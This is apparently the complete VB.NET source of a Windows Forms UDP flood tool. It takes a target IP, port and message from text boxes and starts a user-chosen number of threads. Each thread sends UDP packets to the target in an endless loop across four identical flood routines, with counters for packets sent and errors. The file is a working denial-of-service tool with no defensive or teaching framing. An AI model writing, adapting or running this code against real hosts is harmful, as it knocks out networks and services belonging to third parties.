Imports System.Net
Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Threading
Public Class Form1
    Dim list As New List(Of Threading.Thread)
    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        Label5.Visible = False
        Label6.Visible = False
        Label7.Visible = False
        Label8.Visible = False
    End Sub
    Sub udp1()
        Try
            Dim GLOIP As IPAddress 'Target
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(TextBox1.Text) ' Textbox1.Text= IP/Target
            bytCommand = Encoding.ASCII.GetBytes(TextBox3.Text) 'Message in byte
            Do
                Dim udpClient As New UdpClient 'Protocol
                udpClient.Connect(GLOIP, TextBox2.Text) 'Connect to Target (Textbox2.text=Port)
                udpClient.Send(bytCommand, bytCommand.Length) 'Send Message
                udpClient.Close()
                Label13.Text += 1 'Label1.text= Connections
            Loop
        Catch ex As Exception
            Label17.Text += 1
        End Try
    End Sub
    Sub udp2()
        Try
            Dim GLOIP As IPAddress 'Target
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(TextBox1.Text) ' Textbox1.Text= IP/Target
            bytCommand = Encoding.ASCII.GetBytes(TextBox3.Text) 'Message in byte
            Do
                Dim udpClient As New UdpClient 'Protocol
                udpClient.Connect(GLOIP, TextBox2.Text) 'Connect to Target (Textbox2.text=Port)
                udpClient.Send(bytCommand, bytCommand.Length) 'Send Message
                udpClient.Close()
                Label14.Text += 1 'Label1.text= Connections
            Loop
        Catch ex As Exception
            Label18.Text += 1
        End Try
    End Sub
    Sub udp3()
        Try
            Dim GLOIP As IPAddress 'Target
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(TextBox1.Text) ' Textbox1.Text= IP/Target
            bytCommand = Encoding.ASCII.GetBytes(TextBox3.Text) 'Message in byte
            Do
                Dim udpClient As New UdpClient 'Protocol
                udpClient.Connect(GLOIP, TextBox2.Text) 'Connect to Target (Textbox2.text=Port)
                udpClient.Send(bytCommand, bytCommand.Length) 'Send Message
                udpClient.Close()
                Label15.Text += 1 'Label1.text= Connections
            Loop
        Catch ex As Exception
            Label19.Text += 1
        End Try
    End Sub
    Sub udp4()
        Try
            Dim GLOIP As IPAddress 'Target
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(TextBox1.Text) ' Textbox1.Text= IP/Target
            bytCommand = Encoding.ASCII.GetBytes(TextBox3.Text) 'Message in byte
            Do
                Dim udpClient As New UdpClient 'Protocol
                udpClient.Connect(GLOIP, TextBox2.Text) 'Connect to Target (Textbox2.text=Port)
                udpClient.Send(bytCommand, bytCommand.Length) 'Send Message
                udpClient.Close()
                Label16.Text += 1 'Label1.text= Connections
            Loop
        Catch ex As Exception
            Label20.Text += 1
        End Try
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Label5.Visible = True
        Label9.Visible = False
        list.Clear()
        For i = 0 To TrackBar1.Value - 1
            Dim UDPFlood As New Threading.Thread(AddressOf udp1)
            UDPFlood.Start()
            list.Add(UDPFlood)

        Next
    End Sub

    Private Sub TrackBar1_Scroll(sender As System.Object, e As System.EventArgs) Handles TrackBar1.Scroll
        Label21.Text = "Threads : " & TrackBar1.Value
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Label5.Visible = False
        Label9.Visible = True
        For i = 0 To list.Count - 1
            list(i).Abort()
        Next
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        Label6.Visible = True
        Label10.Visible = False
        list.Clear()
        For i = 0 To TrackBar1.Value - 1
            Dim UDPFlood2 As New Threading.Thread(AddressOf udp2)
            UDPFlood2.Start()
            list.Add(UDPFlood2)

        Next
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        Label7.Visible = True
        Label11.Visible = False
        list.Clear()
        For i = 0 To TrackBar1.Value - 1
            Dim UDPFlood3 As New Threading.Thread(AddressOf udp3)
            UDPFlood3.Start()
            list.Add(UDPFlood3)

        Next
    End Sub

    Private Sub Button7_Click(sender As System.Object, e As System.EventArgs) Handles Button7.Click
        Label8.Visible = True
        Label12.Visible = False
        list.Clear()
        For i = 0 To TrackBar1.Value - 1
            Dim UDPFlood4 As New Threading.Thread(AddressOf udp4)
            UDPFlood4.Start()
            list.Add(UDPFlood4)

        Next
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        Label6.Visible = False
        Label10.Visible = True
        For i = 0 To list.Count - 1
            list(i).Abort()
        Next
    End Sub

    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        Label7.Visible = False
        Label11.Visible = True
        For i = 0 To list.Count - 1
            list(i).Abort()
        Next
    End Sub

    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        Label8.Visible = False
        Label12.Visible = True
        For i = 0 To list.Count - 1
            list(i).Abort()
        Next
    End Sub
End Class
